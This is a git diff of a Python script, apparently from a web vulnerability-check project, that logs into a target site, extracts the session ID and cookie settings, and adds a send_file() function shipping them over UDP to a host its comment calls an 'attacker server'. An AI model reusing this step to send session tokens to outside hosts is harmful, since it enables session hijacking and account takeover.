@@ -7,7 +7,42 @@ from pymongo import MongoClient
 from pymongo.cursor import CursorType
 import socket
 import datetime
+import sys
+import time
 
+def send_file():
+    #IP = '127.0.0.1'
+    #PORT = 5005
+    filename = 'Broken_Authentication.txt'
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    net_filename = filename.encode()
+    sock.sendto(net_filename, (IP, PORT))
+
+    f = open(filename, 'rb')
+    data = f.read(1024)
+    while(data):
+        if(sock.sendto(data, (IP, PORT))):
+            data = f.read(1024)
+            time.sleep(0.02)
+    sock.close()
+    f.close()
+
+# showing sessionid Settings
+def makeCookieDict(data):
+    cookie_dict = {}
+    data = data.split('Cookie(')[2].split(')')[0]
+    data = data.split(', ')
+    for i in data:
+        if '{' in i:
+            i = i.split('{')[1]
+        elif '}' in i:
+            i = i.replace('}','')
+        i = i.replace('\'', '')
+        i = re.split(r':|=', i)
+    #print(i)
+        cookie_dict[i[0]] = i[1]
+    return cookie_dict
 
 
 class DBHandler:
@@ -53,15 +88,9 @@ class DBHandler:
         result = self.client[db_name][collection_name].find({"$text": {"$search": text}})
         return result
 
-
-
-
-if __name__ == "__main__" :
-    #url입력
-    userUrl = (input("url : "))
-
+def brokenAuthentication(url, id, password):
     #타겟페이지 접속
-    access = requests.get(userUrl)
+    access = requests.get(url)
 
 
     #main page에서 loginpage 추출
@@ -70,7 +99,7 @@ if __name__ == "__main__" :
     for b in parse :
         href = b.attrs['href'] #accounts/login/
 
-    loginpage = userUrl+href #accounts/login 페이지!
+    loginpage = url+href #accounts/login 페이지!
 
 
     #login 페이지 login/password 입력칸 찾기
@@ -85,15 +114,12 @@ if __name__ == "__main__" :
         reqpw = f.attrs['name'] # 대상 페이지의 pw입력칸 name = "password"
 
 
-    #유저 id pw 입력
-    userID = (input("ID : "))
-    userPW = (input("PW : "))
 
 
     #post requests data 완성
     payload = {
-        reqid : userID,
-        reqpw : userPW
+        reqid : id,
+        reqpw : password
     }
     
     #header 정보입력
@@ -105,11 +131,11 @@ if __name__ == "__main__" :
 
 
     #post request process
-    req = requests.get(userUrl+href)
+    req = requests.get(url+href)
     session = requests.session()
-    login = session.post(userUrl + href, headers = headers, \
+    login = session.post(url + href, headers = headers, \
                     data=payload)
-    response = session.get(userUrl)
+    response = session.get(url)
 
 
     # 대상 웹페이지가 사용하고 있는 세션id 이름을 파싱
@@ -125,25 +151,9 @@ if __name__ == "__main__" :
 
     #user's data for attacker server
     data = {
-        'url' : userUrl,
+        'url' : url,
         'sessionID' : result
     }
-
-    # showing sessionid Settings
-    def makeCookieDict(data):
-        cookie_dict = {}
-        data = data.split('Cookie(')[2].split(')')[0]
-        data = data.split(', ')
-        for i in data:
-            if '{' in i:
-                i = i.split('{')[1]
-            elif '}' in i:
-                i = i.replace('}','')
-            i = i.replace('\'', '')
-            i = re.split(r':|=', i)
-        #print(i)
-            cookie_dict[i[0]] = i[1]
-        return cookie_dict
     #cookie_dict는 전체 설정값
     cookie_dict = makeCookieDict(str(session.cookies.keys))
     if 'maxAge' not in cookie_dict.keys():
@@ -151,7 +161,7 @@ if __name__ == "__main__" :
 
 
     '''
-    print("<"+userID+"'s Session Settings>")
+    print("<"+id+"'s Session Settings>")
     for key, value in cookie_dict.items():
     print(' ' + key + " = " + value)
     '''
@@ -183,10 +193,11 @@ if __name__ == "__main__" :
         'samesite' : cookie_dict['SameSite'],
     }
 
-    print(data)
+    #print(data)
     f = open('Broken_Authentication.txt', 'w')
-    f.write(userUrl + '\n' + result + '\n' + str(data))
+    f.write(url + '\n' + result + '\n' + str(data))
     f.close()
+    send_file()
 
 
 
@@ -202,3 +213,10 @@ if __name__ == "__main__" :
 
 
 
+if __name__ == "__main__" :
+    #url입력
+    userUrl = (input("url : "))
+    #유저 id pw 입력
+    userID = (input("ID : "))
+    userPW = (input("PW : "))
+    brokenAuthentication(userUrl, userID, userPW)
